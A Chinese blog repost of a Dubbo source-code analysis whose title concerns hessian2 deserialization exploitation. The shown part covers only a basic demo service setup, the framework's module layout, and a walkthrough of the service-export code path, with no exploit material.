<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="dubbo,反序列化,hessian2,dubbo协议,">










<meta name="description" content="【原文来自安全客 https://www.anquanke.com/post/id/197658】 一、前言官方github描述：1Apache Dubbo is a high-performance, java based, open source RPC framework. Apache Dubbo是一款高性能、轻量级的开源Java RPC框架，它提供了三大核心能力：面向接口的远程方法调用，">
<meta name="keywords" content="dubbo,反序列化,hessian2,dubbo协议">
<meta property="og:type" content="article">
<meta property="og:title" content="dubbo源码浅析-默认dubbo协议反序列化利用之hessian2">
<meta property="og:url" content="http://yoursite.com/2020/02/14/dubbo源码浅析-默认dubbo协议反序列化利用之hessian2/index.html">
<meta property="og:site_name" content="大彩笔threedr3am">
<meta property="og:description" content="【原文来自安全客 https://www.anquanke.com/post/id/197658】 一、前言官方github描述：1Apache Dubbo is a high-performance, java based, open source RPC framework. Apache Dubbo是一款高性能、轻量级的开源Java RPC框架，它提供了三大核心能力：面向接口的远程方法调用，">
<meta property="og:locale" content="zh-Hans">
<meta property="og:updated_time" content="2020-02-14T08:11:30.560Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="dubbo源码浅析-默认dubbo协议反序列化利用之hessian2">
<meta name="twitter:description" content="【原文来自安全客 https://www.anquanke.com/post/id/197658】 一、前言官方github描述：1Apache Dubbo is a high-performance, java based, open source RPC framework. Apache Dubbo是一款高性能、轻量级的开源Java RPC框架，它提供了三大核心能力：面向接口的远程方法调用，">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2020/02/14/dubbo源码浅析-默认dubbo协议反序列化利用之hessian2/">





  <title>dubbo源码浅析-默认dubbo协议反序列化利用之hessian2 | 大彩笔threedr3am</title>
  





  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?8346bb07e7843cd10a2ee33017b3d627";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>




</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">大彩笔threedr3am</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/14/dubbo源码浅析-默认dubbo协议反序列化利用之hessian2/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="threedr3am">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/avator/duolaAmeng.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="大彩笔threedr3am">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">dubbo源码浅析-默认dubbo协议反序列化利用之hessian2</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-14T16:08:00+08:00">
                2020-02-14
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/java框架源码分析/" itemprop="url" rel="index">
                    <span itemprop="name">java框架源码分析</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>【原文来自安全客 <a href="https://www.anquanke.com/post/id/197658】" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197658】</a></p>
<h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>官方github描述：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache Dubbo is a high-performance, java based, open source RPC framework.</span><br></pre></td></tr></table></figure></p>
<p>Apache Dubbo是一款高性能、轻量级的开源Java RPC框架，它提供了三大核心能力：面向接口的远程方法调用，智能容错和负载均衡，以及服务自动注册和发现。</p>
<p>现在大部分企业开发，无论是微服务架构，还是传统的垂直切分架构，大部分都用到了RPC（远程过程调用），实现分布式的协作，其中有比较简单的RESTful方式的RPC实现，也有自定义协议自成一系的RPC实现，而大部分RPC实现框架都使用了一种或多种序列化方式对传输数据进行序列化以及反序列化。</p>
<p>Apache Dubbo是本篇文章主要讲述的RPC实现框架，我会使用我一贯的源码浅析风格，对其进行原理细节的分析探讨，先从dubbo的简单使用，慢慢引申出其源码架构细节，最后在了解大概原理后，重点分析其默认hessian2序列化实现细节。</p>
<p>我希望您看完这篇文章之后，能对dubbo的大概架构和源码具有比较清晰的理解，以及对序列化、反序列化部分有充分的理解，希望为您学习dubbo源码走少一点弯路，并且能挖掘出dubbo的潜在安全问题，从而完善它，使它更加的健壮更加的安全。</p>
<a id="more"></a>
<h3 id="二、源码浅析"><a href="#二、源码浅析" class="headerlink" title="二、源码浅析"></a>二、源码浅析</h3><h4 id="2-1-简单使用"><a href="#2-1-简单使用" class="headerlink" title="2.1 简单使用"></a>2.1 简单使用</h4><p>dubbo的使用非常简单，一般普遍使用的是传统的spring方式，不过这种方式使用上没有在spring-boot上使用更便捷。</p>
<h5 id="2-1-1-启动注册中心（zookeeper）"><a href="#2-1-1-启动注册中心（zookeeper）" class="headerlink" title="2.1.1 启动注册中心（zookeeper）"></a>2.1.1 启动注册中心（zookeeper）</h5><p>启动一个本地的zookeeper，端口为2181</p>
<h5 id="2-1-2-服务端"><a href="#2-1-2-服务端" class="headerlink" title="2.1.2 服务端"></a>2.1.2 服务端</h5><p>service（接口定义和实现相关）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public class A implements Serializable &#123;</span><br><span class="line">  String name = &quot;xxxx&quot;;</span><br><span class="line"></span><br><span class="line">  public String getName() &#123;</span><br><span class="line">    return name;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public void setName(String name) &#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public interface DemoService &#123;</span><br><span class="line"></span><br><span class="line">  String hello(A a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public class DemoServiceImpl implements DemoService &#123;</span><br><span class="line"></span><br><span class="line">  public String hello(A a) &#123;</span><br><span class="line">    return &quot;hello! &quot; + a.getName();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>spring xml配置（dubbo-provider.xml）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">  xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">  xmlns:dubbo=&quot;http://code.alibabatech.com/schema/dubbo&quot;</span><br><span class="line">  xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://code.alibabatech.com/schema/dubbo http://code.alibabatech.com/schema/dubbo/dubbo.xsd&quot;&gt;</span><br><span class="line">  &lt;!-- 提供方应用信息，用于计算依赖关系 --&gt;</span><br><span class="line">  &lt;dubbo:application name=&quot;dubbo-service&quot; /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 使用multicast广播注册中心暴露服务地址 --&gt;</span><br><span class="line">  &lt;!-- &lt;dubbo:registry address=&quot;multicast://4.5.6.7:1234&quot; /&gt; --&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 使用zookeeper注册中心暴露服务地址 --&gt;</span><br><span class="line">  &lt;dubbo:registry address=&quot;zookeeper://127.0.0.1:2181&quot; /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 用dubbo协议在20880端口暴露服务 --&gt;</span><br><span class="line">  &lt;dubbo:protocol name=&quot;dubbo&quot; port=&quot;20880&quot; /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 声明需要暴露的服务接口 --&gt;</span><br><span class="line">  &lt;dubbo:service interface=&quot;com.threedr3am.learn.dubbo.DemoService&quot;</span><br><span class="line">    ref=&quot;demoService&quot; /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 和本地bean一样实现服务 --&gt;</span><br><span class="line">  &lt;bean id=&quot;demoService&quot; class=&quot;com.threedr3am.learn.dubbo.DemoServiceImpl&quot; /&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>
<p>启动jvm创建spring容器（main）:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public class Main &#123;</span><br><span class="line"></span><br><span class="line">  public static void main(String[] args) &#123;</span><br><span class="line">    ApplicationContext applicationContext = new ClassPathXmlApplicationContext(&quot;dubbo-provider.xml&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="2-1-3-客户端"><a href="#2-1-3-客户端" class="headerlink" title="2.1.3 客户端"></a>2.1.3 客户端</h5><p>spring xml配置（dubbo-consumer.xml）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">  xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">  xmlns:dubbo=&quot;http://code.alibabatech.com/schema/dubbo&quot;</span><br><span class="line">  xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://code.alibabatech.com/schema/dubbo http://code.alibabatech.com/schema/dubbo/dubbo.xsd&quot;&gt;</span><br><span class="line">  &lt;!-- 提供方应用信息，用于计算依赖关系 --&gt;</span><br><span class="line">  &lt;dubbo:application name=&quot;dubbo-service-consumer&quot; /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 使用multicast广播注册中心暴露服务地址 --&gt;</span><br><span class="line">  &lt;!-- &lt;dubbo:registry address=&quot;multicast://4.5.6.7:1234&quot; /&gt; --&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 使用zookeeper注册中心暴露服务地址 --&gt;</span><br><span class="line">  &lt;dubbo:registry address=&quot;zookeeper://127.0.0.1:2181&quot; /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 声明需要暴露的服务接口 --&gt;</span><br><span class="line">  &lt;dubbo:reference id=&quot;demoService&quot; interface=&quot;com.threedr3am.learn.dubbo.DemoService&quot;/&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>
<p>启动jvm，执行RPC（main）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public class Main &#123;</span><br><span class="line"></span><br><span class="line">  public static void main(String[] args) &#123;</span><br><span class="line">    ApplicationContext applicationContext = new ClassPathXmlApplicationContext(&quot;dubbo-consumer.xml&quot;);</span><br><span class="line">    DemoService demoService = (DemoService) applicationContext.getBean(&quot;demoService&quot;);</span><br><span class="line">    System.out.println(demoService.hello(new A()));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="2-1-4-RPC"><a href="#2-1-4-RPC" class="headerlink" title="2.1.4 RPC"></a>2.1.4 RPC</h5><p>在上述注册中心、服务端、客户端依次执行后，可以看到，客户端输出了“hello! threedr3am”</p>
<h4 id="2-2-源码跟踪"><a href="#2-2-源码跟踪" class="headerlink" title="2.2 源码跟踪"></a>2.2 源码跟踪</h4><p>我们以上述spring的使用例子展开，一步一步的跟踪源码的执行流程。</p>
<p>从github clone到dubbo的源码后，可以发现，源码（2.6.x版本）分成了很多module</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">├── dubbo-all</span><br><span class="line">├── dubbo-bom</span><br><span class="line">├── dubbo-bootstrap</span><br><span class="line">├── dubbo-cluster</span><br><span class="line">├── dubbo-common</span><br><span class="line">├── dubbo-compatible</span><br><span class="line">├── dubbo-config</span><br><span class="line">├── dubbo-configcenter</span><br><span class="line">├── dubbo-container</span><br><span class="line">├── dubbo-demo</span><br><span class="line">├── dubbo-dependencies</span><br><span class="line">├── dubbo-dependencies-bom</span><br><span class="line">├── dubbo-distribution</span><br><span class="line">├── dubbo-filter</span><br><span class="line">├── dubbo-metadata</span><br><span class="line">├── dubbo-monitor</span><br><span class="line">├── dubbo-parent.iml</span><br><span class="line">├── dubbo-plugin</span><br><span class="line">├── dubbo-registry</span><br><span class="line">├── dubbo-remoting</span><br><span class="line">├── dubbo-rpc</span><br><span class="line">├── dubbo-serialization</span><br><span class="line">├── dubbo-test</span><br></pre></td></tr></table></figure>
<p>接着，我们启动服务端main程序，这里我们略过spring容器的创建细节，因为spring容器的源码。。。这可以写一本书了，我们只从服务端读取解析dubbo-provider.xml配置创建容器后refresh的ServiceBean（dubbo-config中）开始，这里才是真正的dubbo的相关代码起始处。</p>
<p>这边贴一下，服务端程序启动时expose service的执行栈信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">com.alibaba.dubbo.remoting.transport.netty4.NettyTransporter.bind(NettyTransporter.java:32)</span><br><span class="line">com.alibaba.dubbo.remoting.Transporter$Adaptive.bind(Transporter$Adaptive.java)</span><br><span class="line">com.alibaba.dubbo.remoting.Transporters.bind(Transporters.java:56)</span><br><span class="line">com.alibaba.dubbo.remoting.exchange.support.header.HeaderExchanger.bind(HeaderExchanger.java:44)</span><br><span class="line">com.alibaba.dubbo.remoting.exchange.Exchangers.bind(Exchangers.java:70)</span><br><span class="line">com.alibaba.dubbo.rpc.protocol.dubbo.DubboProtocol.createServer(DubboProtocol.java:285)</span><br><span class="line">com.alibaba.dubbo.rpc.protocol.dubbo.DubboProtocol.openServer(DubboProtocol.java:264)</span><br><span class="line">com.alibaba.dubbo.rpc.protocol.dubbo.DubboProtocol.export(DubboProtocol.java:251)</span><br><span class="line">com.alibaba.dubbo.rpc.protocol.ProtocolListenerWrapper.export(ProtocolListenerWrapper.java:57)</span><br><span class="line">com.alibaba.dubbo.rpc.protocol.ProtocolFilterWrapper.export(ProtocolFilterWrapper.java:100)</span><br><span class="line">com.alibaba.dubbo.qos.protocol.QosProtocolWrapper.export(QosProtocolWrapper.java:62)</span><br><span class="line">com.alibaba.dubbo.rpc.Protocol$Adaptive.export(Protocol$Adaptive.java)</span><br><span class="line">com.alibaba.dubbo.registry.integration.RegistryProtocol.doLocalExport(RegistryProtocol.java:172)</span><br><span class="line">com.alibaba.dubbo.registry.integration.RegistryProtocol.export(RegistryProtocol.java:135)</span><br><span class="line">com.alibaba.dubbo.rpc.protocol.ProtocolListenerWrapper.export(ProtocolListenerWrapper.java:55)</span><br><span class="line">com.alibaba.dubbo.rpc.protocol.ProtocolFilterWrapper.export(ProtocolFilterWrapper.java:98)</span><br><span class="line">com.alibaba.dubbo.qos.protocol.QosProtocolWrapper.export(QosProtocolWrapper.java:60)</span><br><span class="line">com.alibaba.dubbo.rpc.Protocol$Adaptive.export(Protocol$Adaptive.java)</span><br><span class="line">com.alibaba.dubbo.config.ServiceConfig.doExportUrlsFor1Protocol(ServiceConfig.java:515)</span><br><span class="line">com.alibaba.dubbo.config.ServiceConfig.doExportUrls(ServiceConfig.java:360)</span><br><span class="line">com.alibaba.dubbo.config.ServiceConfig.doExport(ServiceConfig.java:319)</span><br><span class="line">com.alibaba.dubbo.config.ServiceConfig.export(ServiceConfig.java:217)</span><br><span class="line">com.alibaba.dubbo.config.spring.ServiceBean.export(ServiceBean.java:266)</span><br><span class="line">com.alibaba.dubbo.config.spring.ServiceBean.onApplicationEvent(ServiceBean.java:106)</span><br><span class="line">com.alibaba.dubbo.config.spring.ServiceBean.onApplicationEvent(ServiceBean.java:53)</span><br><span class="line">org.springframework.context.event.SimpleApplicationEventMulticaster.invokeListener(SimpleApplicationEventMulticaster.java:166)</span><br><span class="line">org.springframework.context.event.SimpleApplicationEventMulticaster.multicastEvent(SimpleApplicationEventMulticaster.java:138)</span><br><span class="line">org.springframework.context.support.AbstractApplicationContext.publishEvent(AbstractApplicationContext.java:383)</span><br><span class="line">org.springframework.context.support.AbstractApplicationContext.publishEvent(AbstractApplicationContext.java:337)</span><br><span class="line">org.springframework.context.support.AbstractApplicationContext.finishRefresh(AbstractApplicationContext.java:882)</span><br><span class="line">org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:545)</span><br><span class="line">org.springframework.context.support.ClassPathXmlApplicationContext.&lt;init&gt;(ClassPathXmlApplicationContext.java:139)</span><br><span class="line">org.springframework.context.support.ClassPathXmlApplicationContext.&lt;init&gt;(ClassPathXmlApplicationContext.java:83)</span><br><span class="line">com.threedr3am.learn.dubbo.Main.main(Main.java:12)</span><br></pre></td></tr></table></figure>
<p>下一步，我们跟进dubbo-config的子module，也即dubbo-config-spring这个module，从它的com.alibaba.dubbo.config.spring.ServiceBean类开始。</p>
<p>从我们前面贴出来的执行栈信息，跟进com.alibaba.dubbo.config.spring.ServiceBean类的onApplicationEvent方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">public void onApplicationEvent(ContextRefreshedEvent event) &#123;</span><br><span class="line">    if (isDelay() &amp;&amp; !isExported() &amp;&amp; !isUnexported()) &#123;</span><br><span class="line">        if (logger.isInfoEnabled()) &#123;</span><br><span class="line">            logger.info(&quot;The service ready on spring started. service: &quot; + getInterface());</span><br><span class="line">        &#125;</span><br><span class="line">        export();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>isDelay()：判断服务端，也就是服务提供者provider是否在dubbo:service这个标签配置中配置了delay，若配置了delay值（毫秒为单位），则暴露expose服务会延迟到delay值对应的时间后。若配置了值，isDelay()会返回false，则不执行export()。</li>
<li>export()：暴露服务到注册中心</li>
</ul>
<p>接着，跟进export方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">public void export() &#123;</span><br><span class="line">    //重点方法</span><br><span class="line">    super.export();</span><br><span class="line">    // Publish ServiceBeanExportedEvent</span><br><span class="line">    publishExportEvent();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>父类的expose方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public synchronized void export() &#123;</span><br><span class="line">    //如果ProviderConfig配置存在，并且export、delay等配置为空，则读取ProviderConfig配置</span><br><span class="line">    if (provider != null) &#123;</span><br><span class="line">        if (export == null) &#123;</span><br><span class="line">            export = provider.getExport();</span><br><span class="line">        &#125;</span><br><span class="line">        if (delay == null) &#123;</span><br><span class="line">            delay = provider.getDelay();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (export != null &amp;&amp; !export) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    //若配置了delay延迟暴露，则通过定时调度进行延迟暴露，否则立即暴露服务</span><br><span class="line">    if (delay != null &amp;&amp; delay &gt; 0) &#123;</span><br><span class="line">        delayExportExecutor.schedule(new Runnable() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void run() &#123;</span><br><span class="line">                doExport();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, delay, TimeUnit.MILLISECONDS);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        doExport();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>expose方法做了synchronized同步处理，应该是为了避免并发执行。</p>
<p>doExport方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> protected synchronized void doExport() &#123;</span><br><span class="line">    if (unexported) &#123;</span><br><span class="line">        throw new IllegalStateException(&quot;Already unexported!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (exported) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    exported = true;</span><br><span class="line">    if (interfaceName == null || interfaceName.length() == 0) &#123;</span><br><span class="line">        throw new IllegalStateException(&quot;&lt;dubbo:service interface=\&quot;\&quot; /&gt; interface not allow null!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    checkDefault();</span><br><span class="line">    //...忽略无关重要的细节</span><br><span class="line">    checkApplication();</span><br><span class="line">    checkRegistry();</span><br><span class="line">    checkProtocol();</span><br><span class="line">    appendProperties(this);</span><br><span class="line">    checkStub(interfaceClass);</span><br><span class="line">    checkMock(interfaceClass);</span><br><span class="line">    if (path == null || path.length() == 0) &#123;</span><br><span class="line">        path = interfaceName;</span><br><span class="line">    &#125;</span><br><span class="line">    doExportUrls();</span><br><span class="line">    ProviderModel providerModel = new ProviderModel(getUniqueServiceName(), this, ref);</span><br><span class="line">    ApplicationModel.initProviderModel(getUniqueServiceName(), providerModel);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
